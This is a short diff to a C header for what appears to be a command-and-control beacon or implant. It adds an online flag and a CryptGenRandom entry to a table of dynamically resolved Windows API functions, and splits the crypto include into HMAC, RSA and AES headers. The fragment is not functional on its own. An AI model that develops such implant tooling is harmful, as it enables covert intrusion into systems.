@@ -18,6 +18,7 @@
 typedef struct
 {
 	ULONG BeaconId;
+	BOOLEAN Online;
 
 	struct
 	{
@@ -39,6 +40,7 @@ typedef struct
 		FUNC( LoadLibraryA );
 		FUNC( CryptDecrypt );
 		FUNC( CryptEncrypt );
+		FUNC( CryptGenRandom );
 		FUNC( CryptImportKey );
 		FUNC( CryptCreateHash );
 		FUNC( CryptDestroyKey );
@@ -56,8 +58,10 @@ typedef struct
 
 } BEACON_INSTANCE, *PBEACON_INSTANCE;
 
+#include "crypt/hmac.h"
+#include "crypt/rsa.h"
+#include "crypt/aes.h"
 #include "tebpeb.h"
-#include "crypt.h"
 #include "hash.h"
 #include "peb.h"
 #include "pe.h"
